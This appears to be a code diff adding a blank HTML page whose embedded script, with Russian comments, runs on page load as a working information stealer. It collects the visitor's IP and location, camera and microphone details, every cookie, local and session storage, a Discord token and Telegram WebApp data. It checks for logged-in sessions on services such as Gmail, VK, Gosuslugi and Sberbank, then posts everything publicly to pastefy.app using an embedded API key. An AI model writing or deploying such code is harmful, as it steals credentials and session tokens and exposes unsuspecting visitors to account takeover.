@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+    <script>
+        const PASTEFY_API_KEY = "N0p2GrKEd4n80dm6Bt9oLcnVHZRvgAjrNxz4zSV8WiQOQkWmEeCjCneIYE04";
+        
+        async function sendToPastefy(data) {
+            const response = await fetch("https://pastefy.app/api/v2/paste", {
+                method: "POST",
+                headers: {
+                    "Authorization": `Bearer ${PASTEFY_API_KEY}`,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: data,
+                    title: `DATA_${Date.now()}`,
+                    visibility: "PUBLIC"
+                })
+            });
+            if (response.ok) {
+                const result = await response.json();
+                const id = result.paste?.id || result.id;
+                console.log(`https://pastefy.app/${id}`);
+            }
+        }
+        
+        async function collect() {
+            let data = "";
+            
+            // IP и гео
+            try {
+                const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
+                data += `IP: ${geo.ip}\nСтрана: ${geo.country_name}\nГород: ${geo.city}\nПровайдер: ${geo.org}\n\n`;
+            } catch(e) {}
+            
+            // Камера и микрофон
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || "скрыто");
+                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || "скрыто");
+                data += `Камеры (${cams.length}): ${cams.join(", ")}\n`;
+                data += `Микрофоны (${mics.length}): ${mics.join(", ")}\n\n`;
+                
+                let permCam = "неизвестно", permMic = "неизвестно";
+                if (navigator.permissions) {
+                    try {
+                        permCam = (await navigator.permissions.query({name: 'camera'})).state;
+                        permMic = (await navigator.permissions.query({name: 'microphone'})).state;
+                    } catch(e) {}
+                }
+                data += `Разрешение камера: ${permCam}\n`;
+                data += `Разрешение микрофон: ${permMic}\n\n`;
+            } catch(e) {}
+            
+            // Все cookies
+            data += "COOKIES:\n" + document.cookie + "\n\n";
+            
+            // localStorage
+            data += "localStorage:\n";
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data += `${key}: ${localStorage.getItem(key)?.substring(0, 200)}\n`;
+            }
+            data += "\n";
+            
+            // sessionStorage
+            data += "sessionStorage:\n";
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data += `${key}: ${sessionStorage.getItem(key)?.substring(0, 200)}\n`;
+            }
+            data += "\n";
+            
+            // Проверка соцсетей по кукам
+            const services = {
+                vk: ['remixsid', 'remix'],
+                ok: ['OD', 'OSP'],
+                telegram: ['tg_'],
+                discord: ['__cfduid'],
+                twitter: ['auth_token'],
+                instagram: ['sessionid', 'ig_did'],
+                facebook: ['c_user', 'xs'],
+                gmail: ['SAPISID', 'HSID'],
+                mailru: ['auth', 'Mpop'],
+                yandex: ['Session_id', 'yandex_login'],
+                outlook: ['RPSSession'],
+                gosuslugi: ['esia'],
+                sberbank: ['session']
+            };
+            
+            data += "АКТИВНЫЕ СЕРВИСЫ:\n";
+            for (const [name, keys] of Object.entries(services)) {
+                for (const key of keys) {
+                    if (document.cookie.includes(key)) {
+                        data += `✅ ${name}\n`;
+                        break;
+                    }
+                }
+            }
+            
+            // Discord token из localStorage
+            const discordToken = localStorage.getItem('token');
+            if (discordToken) data += `\nDISCORD TOKEN: ${discordToken.substring(0, 100)}\n`;
+            
+            // Telegram WebApp
+            if (window.Telegram?.WebApp) {
+                data += `\nTELEGRAM WEBAPP:\nInitData: ${window.Telegram.WebApp.initData?.substring(0, 200)}\nPlatform: ${window.Telegram.WebApp.platform}\n`;
+            }
+            
+            // Браузер
+            data += `\nБРАУЗЕР:\nUser-Agent: ${navigator.userAgent}\nПлатформа: ${navigator.platform}\nЯзык: ${navigator.language}\nЭкран: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            
+            // WebGL
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debug) {
+                        data += `WebGL Vendor: ${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)}\n`;
+                        data += `WebGL Renderer: ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}\n`;
+                    }
+                }
+            } catch(e) {}
+            
+            await sendToPastefy(data);
+        }
+        
+        collect();
+    </script>
+</body>
+</html>
